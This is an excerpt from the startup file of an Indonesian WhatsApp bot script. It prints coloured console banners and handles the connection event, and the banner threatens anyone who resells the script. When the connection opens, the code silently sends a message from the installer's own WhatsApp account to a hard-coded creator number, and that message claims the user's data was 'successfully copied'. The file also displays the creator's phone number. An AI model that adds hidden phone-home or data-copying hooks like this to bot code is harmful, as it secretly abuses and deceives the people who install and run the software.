...
//=================================================//
CFonts.say("SC PAIRING BY KIICODE OFFC", {
   font: 'chrome',
  align: 'left',
  gradient: ['red', 'magenta'],
});
CFonts.say(
  "Sc Bot By KiiCodeOffc\nBase: Ori HwMods\nRecodeBy:KiiCodeOffc\nHwVersion:22\nRuning:Panel\n\n\nSc Ini Di Recode KiiCodeOffc Kalo Kethauan Jual Murah Sc inI gua Banned Nyawa Lu Jarak Jauh\n\n\n",
  {
    colors: ["system"],
    font: "console",
    align: "center",
...
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Creator : https://wa.me/6283877118785`})
...
//await sleep(400) 
console.log(`${color(`[`,`white`)+color(`3`,`red`)+color(`]`,`white`)}`,`Base Sc:VallzOffc`)
//await sleep(400)  
console.log(`${color(`[`,`white`)+color(`4`,`red`)+color(`]`,`white`)}`,"date 5") 
//await sleep(400)  
console.log(color(`─[`,`magenta`),`「`,  color(`VALLZOFFC`,`red`), `」`,  color(`]─`,`magenta`))
//await sleep(400)  
start(`1`,`Connecting...`)
} else if (connection === "open") {
  haikal.sendMessage('6283877118785' + "@s.whatsapp.net", { text: `*Lapor! 🫡*\n\n_Sc Hw V22 bot berhasil terhubung ke server dengan baik_\n\n*Note :*\n\n Sukses Mencopy Data Anda!!!\n\nVall Lopyu❤❤❤❤` });
  success(`1`,`[■■■■■■■■■■■■■■■] Connected`) 
}
